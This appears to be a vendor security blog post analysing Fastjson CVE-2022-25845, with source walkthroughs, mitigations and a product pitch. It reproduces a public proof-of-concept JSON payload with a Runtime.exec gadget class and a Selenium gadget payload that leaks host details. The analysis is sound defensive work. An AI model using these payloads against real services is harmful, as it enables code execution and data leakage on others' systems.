@@ -1,0 +1,298 @@
+
+
+A few weeks ago, a new version for Fastjson was released (1.2.83) which contains a fix for a security vulnerability that allegedly allows an attacker to execute code on a remote machine. According to several publications, this vulnerability allows an attacker to bypass the “AutoTypeCheck” mechanism in Fastjson and achieve remote code execution.
+This Fastjson vulnerability only recently received a CVE identifier – CVE-2022-25845, and a high CVSS – 8.1. Despite that, this vulnerability is still shrouded in mystery. Although it is touted as a high-severity RCE in a ubiquitous component (almost 5000 Maven projects depend on Fastjson!), there are barely any public technical details about it – who exactly is vulnerable and under which conditions?
+In this blog post, we provide an in-depth look into this Fastjson vulnerability, its severity, which types of Java applications are affected by it, and finally mitigation strategies for developers that cannot currently upgrade to the fixed Fastjson version.
+Who is affected by the Fastjson vulnerability CVE-2022-25845?
+This vulnerability affects all Java applications that rely on Fastjson versions 1.2.80 or earlier and that pass user-controlled data to either the JSON.parse or JSON.parseObject APIs without specifying a specific class to deserialize.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214434_897685\1_nonexhaustiveexampleofvulnerableandsafeAPIs.png
+A non-exhaustive example of vulnerable and safe APIs
+Although this seems broad, we will see that even under these preconditions, the attacker can only invoke a specific type of Java deserialization gadget with this vulnerability (gadget classes that extend the Throwable class), which severely limits the vulnerability’s real-world impact.
+Technical deep-dive
+Fastjson is a Java package that can serialize and deserialize Java objects to and from JSON.
+Like most JSON classes, Fastjson supports serializing/deserializing basic JSON types (Arrays and Objects) into their Java equivalents – Arrays and Maps (respectively).
+However, Fastjson can also deserialize the user’s Java objects (POJOs) to and from JSON.
+For example, suppose we have a defined class named User; the following code will serialize it to JSON and then deserialize it back:
+import com.alibaba.fastjson.JSON;
+...
+public class App
+{
+    public static void main( String[] args )
+    {
+        ...
+  String jsonString = JSON.toJSONString(user);
+  User user2 = JSON.parseObject(jsonString, User.class);
+    }
+}
+JSON.parseObject() returns a JSONObject which later will be converted to the User class.
+Sometimes, the developer wants to create more dynamic code that will accept a serialized JSON that will tell the code which type of class the JSON should get deserialized as. For example, suppose the following JSON is given:
+{
+    "users": [
+        {
+            "@type": "AdminUser",
+            "username": "admin",
+            "password": "21232f297a57a5a743894a0e4a801fc3"
+        },
+        {
+            "@type": "GuestUser",
+            "username": "guest",
+            "password": ""
+        }
+    ]
+}
+Fastjson supports a feature called “AutoType”, which when enabled, can induce the type for each user entry. A developer needs only invoke:
+JSONObject obj = JSON.parseObject(jsonString, Feature.SupportAutoType);
+JSONArray users = (JSONArray)obj.get("users");
+// Users[0] is of class type "AdminUser"
+// Users[1] is of class type "GuestUser"
+However, if the deserialized JSON is user-controlled, parsing it with AutoType enabled can lead to a deserialization security issue, since the attacker can instantiate any class that’s available on the Classpath, and feed its constructor with arbitrary arguments. This has been demonstrated to be exploitable many times, and frameworks such as ysoserial exist to create such exploit vectors (Java “gadget” classes).
+Therefore, the developers of Fastjson opted to disable AutoType by default, which should make parsing arbitrary JSON data safe. However, the AutoType mechanism is more complicated than that…
+Bypassing the AutoType disabled-by-default policy
+When JSON.parseObject() is called it eventually gets to DefaultJSONParser.parseObject() with object set to JSONObject and fieldName set to null. When this function encounters the “@type” specifier (JSON.DEFAULT_TYPE_KEY) it will call config.checkAutoType:
+if (key == JSON.DEFAULT_TYPE_KEY
+        && !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
+    String typeName = lexer.scanSymbol(symbolTable, '"');
+ 
+    if (lexer.isEnabled(Feature.IgnoreAutoType)) {
+        continue;
+    }
+Eventually, with all the default flags, the code will arrive at config.checkAutoType(). Here, we can see a list of classes that are blacklisted and therefore cannot be instantiated by the AutoType mechanism:
+if (expectClass == null) {
+            expectClassFlag = false;
+        } else {
+            long expectHash = TypeUtils.fnv1a_64(expectClass.getName());
+            if (expectHash == 0x90a25f5baa21529eL
+                    || expectHash == 0x2d10a5801b9d6136L
+                    || expectHash == 0xaf586a571e302c6bL
+                    || expectHash == 0xed007300a7b227c6L
+                    || expectHash == 0x295c4605fd1eaa95L
+                    || expectHash == 0x47ef269aadc650b4L
+                    || expectHash == 0x6439c4dff712ae8bL
+                    || expectHash == 0xe3dd9875a2dc5283L
+                    || expectHash == 0xe2a8ddba03e69e0dL
+                    || expectHash == 0xd734ceb4c3e9d1daL
+            ) {
+                expectClassFlag = false;
+            } else {
+                expectClassFlag = true;
+            }
+        }
+These are the blacklisted classes that are banned here:
+
+java.lang.Object
+java.io.Serializable
+java.lang.Cloneable
+java.lang.Runnable
+java.lang.AutoCloseable
+java.io.Closeable
+java.lang.Iterable
+java.util.Collection
+java.lang.Readable
+java.util.EventListener
+You can see more blacklisted classes in fastjson-blacklist, a repository that maintains a list of blacklisted hashes that were added to Fastjson.
+Eventually, the code will try to find the deserializer that should be used for deserializing the JSON-serialized class:
+ObjectDeserializer deserializer = config.getDeserializer(clazz);
+                    Class deserClass = deserializer.getClass();
+                    if (JavaBeanDeserializer.class.isAssignableFrom(deserClass)
+                            && deserClass != JavaBeanDeserializer.class
+                            && deserClass != ThrowableDeserializer.class) {
+                        this.setResolveStatus(NONE);
+                    } else if (deserializer instanceof MapDeserializer) {
+                        this.setResolveStatus(NONE);
+                    }
+                    Object obj = deserializer.deserialze(this, clazz, fieldName);
+Inside ParserConfig.getDeserializer() we have a critical check which verifies whether the target class is extending the Throwable class:
+} else if (Throwable.class.isAssignableFrom(clazz)) {
+            deserializer = new ThrowableDeserializer(this, clazz);
+ThrowableDeserializer.deserialize() processes the rest of the data. If “@type” is found it will check it with autoTypeCheck() and continue with deserialization normally:
+if (JSON.DEFAULT_TYPE_KEY.equals(key)) {
+                if (lexer.token() == JSONToken.LITERAL_STRING) {
+                    String exClassName = lexer.stringVal();
+                    exClass = parser.getConfig().checkAutoType(exClassName, Throwable.class, lexer.getFeatures());
+So the heart of the vulnerability lies at the fact that Fastjson will happily deserialize arbitrary classes, as long as the target class extends the Throwable class!
+The function responsible for creating the deserialized class in this case is createException() which looks for 3 different types of constructors – one without any arguments, one with a message argument and one with a message and cause arguments. After that, it will try to call the more elaborate constructor first (causeConstructor, messageConstructor and then defaultConstructor):
+private Throwable createException(String message, Throwable cause, Class<?> exClass) throws Exception {
+        Constructor<?> defaultConstructor = null;
+        Constructor<?> messageConstructor = null;
+        Constructor<?> causeConstructor = null;
+        for (Constructor<?> constructor : exClass.getConstructors()) {
+            Class<?>[] types = constructor.getParameterTypes();
+            if (types.length == 0) {
+                defaultConstructor = constructor;
+                continue;
+            }
+ 
+            if (types.length == 1 && types[0] == String.class) {
+                messageConstructor = constructor;
+                continue;
+            }
+ 
+            if (types.length == 2 && types[0] == String.class && types[1] == Throwable.class) {
+                causeConstructor = constructor;
+                continue;
+            }
+        }
+ 
+        if (causeConstructor != null) {
+            return (Throwable) causeConstructor.newInstance(message, cause);
+        }
+ 
+        if (messageConstructor != null) {
+            return (Throwable) messageConstructor.newInstance(message);
+        }
+ 
+        if (defaultConstructor != null) {
+            return (Throwable) defaultConstructor.newInstance();
+        }
+As part of the class instantiation, a setter will also be called for every relevant member:
+if (otherValues != null) {
+            JavaBeanDeserializer exBeanDeser = null;
+ 
+            if (exClass != null) {
+                if (exClass == clazz) {
+                    exBeanDeser = this;
+                } else {
+                    ObjectDeserializer exDeser = parser.getConfig().getDeserializer(exClass);
+                    if (exDeser instanceof JavaBeanDeserializer) {
+                        exBeanDeser = (JavaBeanDeserializer) exDeser;
+                    }
+                }
+            }
+ 
+            if (exBeanDeser != null) {
+                for (Map.Entry<String, Object> entry : otherValues.entrySet()) {
+                    String key = entry.getKey();
+                    Object value = entry.getValue();
+ 
+                    FieldDeserializer fieldDeserializer = exBeanDeser.getFieldDeserializer(key);
+                    if (fieldDeserializer != null) {
+                        FieldInfo fieldInfo = fieldDeserializer.fieldInfo;
+                        if (!fieldInfo.fieldClass.isInstance(value)) {
+                            value = TypeUtils.cast(value, fieldInfo.fieldType, parser.getConfig());
+                        }
+                        fieldDeserializer.setValue(ex, value);
+                    }
+                }
+            }
+        }
+How can CVE-2022-25845 be exploited?
+After seeing the above “loophole” in the AutoType mechanism, let us examine the real-world viability of a published exploit that supposedly achieves remote code execution.
+An exploit that was published by YoungBear runs an arbitrary OS command by supplying this JSON:
+{
+    "@type": "java.lang.Exception",
+    "@type": "com.example.fastjson.poc20220523.Poc20220523",
+    "name": "calc"
+}
+The exploit relies on the following Exception-derived class being defined in the Java application:
+package com.example.fastjson.poc20220523;
+ 
+import java.io.IOException;
+ 
+/**
+ * @author youngbear
+ * @email youngbear@aliyun.com
+ * @date 2022/5/29 8:28
+ * @blog https://blog.csdn.net/next_second
+ * @github https://github.com/YoungBear
+ * @description POC类：需要代码中有该类
+ */
+public class Poc20220523 extends Exception {
+    public void setName(String str) {
+        try {
+            Runtime.getRuntime().exec(str);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}
+When deserializing the JSON excerpt above, the Poc20220523 class gets created, and the supplied name argument is assigned through the automatic setter.
+As shown, this will end up calling the malicious setName() setter function with str = “calc”:
+public void setName(String str) {
+        try {
+            Runtime.getRuntime().exec(str);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+Which will run the payload (opening the Windows Calculator):
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214434_897685\2_openingtheWindowsCalculator.png
+
+This exploit is obviously just a demonstration, since no reasonable Java application will contain an exception-derived class similar to Poc20220523, which immediately runs shell commands based on an external argument.
+The burning question is – are there any well-known Java “gadget” classes which can be abused as part of this vulnerability? Namely – classes that are Exception/Throwable derived and contain relevant constructors or setter methods that can cause a real world security impact?
+Currently, a single compatible gadget class (from the Selenium package) was published here which causes a very-low-impact data leakage:
+{
+    "x":{
+      "@type":"java.lang.Exception",
+      "@type":"org.openqa.selenium.WebDriverException"
+    },
+    "y":{
+      "$ref":"$x.systemInformation"
+    }
+}
+Deserializing this JSON will end up creating a HashMap with “y” set to some basic information about the machine:
+"System info: host: '', ip: '', os.name: '', os.arch: '', os.version: '', java.version: ''"
+Depending on the application, this information might end up stored or sent to the attacker (for example, if it is written to a remotely accessible log).
+After examining other well-known sources such as ysoserial, we did not find any gadget classes that can lead to remote code execution in a real world scenario. Therefore, an attacker that wishes to exploit this vulnerability in the real world will need to perform deep research on the attacked Java application, in order to find a custom Java “gadget” class (loaded in the Classpath), that extends Exception/Throwable and contains the relevant methods that can be used to gain privileges, leak data or even run arbitrary code.
+To conclude, we assess that currently this vulnerability does not seem to pose a high threat. Although a public PoC exploit exists and the potential impact is very high (remote code execution) the conditions for the attack are not trivial (passing untrusted input to specific vulnerable APIs) and most importantly – target-specific research is required to find a suitable gadget class to exploit (which will probably not exist at all, due to its unlikely attributes).
+How can CVE-2022-25845 be remediated?
+To fully remediate CVE-2022-25845, we recommend upgrading Fastjson to the latest version, which is currently 1.2.83.
+How can CVE-2022-25845 be mitigated?
+Enabling Fastjson’s “Safe Mode” mitigates this vulnerability.
+Safe Mode can be enabled by performing any of the following –
+
+Via code –
+
+ParserConfig.getGlobalInstance().setSafeMode(true);
+Via JVM startup parameters –
+
+-Dfastjson.parser.safeMode=true
+Via Fastjson’s properties file –
+
+fastjson.parser.safeMode=true
+Is the JFrog Platform Vulnerable to this Fastjson vulnerability?
+After conducting a comprehensive internal inspection, we concluded that the JFrog DevOps platform is not vulnerable to this latest Fastjson vulnerability.
+Stay up-to-date with JFrog Security Research
+Follow the latest discoveries and technical updates from the JFrog Security Research team in our security research blog posts and on Twitter at @JFrogSecurity.
+Find vulnerable versions with JFrog Xray
+In addition to exposing new security vulnerabilities and threats, JFrog provides developers and security teams easy access to the latest relevant information for their software with automated security scanning by JFrog Xray SCA tool.
+JFrog Xray performs automated Contextual Analysis of CVEs, accelerating time to resolution of vulnerabilities that are actually exploitable in production. JFrog’s contextual analysis engine can detect Java binary artifacts that pass non-constant input to the APIs vulnerable to this issue (parse and parseObject), and verify that the APIs do not limit the deserialization to a specific class via a 2nd argument.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214434_897685\CVE202225845.png
+
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214434_897685\CVE202225845_21.png
+
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214434_897685\CVE202225845_3.png
+
+
+JSON.parse
+JSON.parseObject
+Throwable
+User
+JSON.parseObject()
+JSONObject
+User
+JSON.parseObject()
+DefaultJSONParser.parseObject()
+object
+JSONObject
+fieldName
+config.checkAutoType
+config.checkAutoType()
+Throwable
+ThrowableDeserializer.deserialize()
+autoTypeCheck()
+Throwable
+createException()
+causeConstructor
+messageConstructor
+defaultConstructor
+Poc20220523
+name
+setName()
+str
+“calc”
+Poc20220523
+ParserConfig.getGlobalInstance().setSafeMode(true);
+-Dfastjson.parser.safeMode=true
+fastjson.parser.safeMode=true
+parse
+parseObject
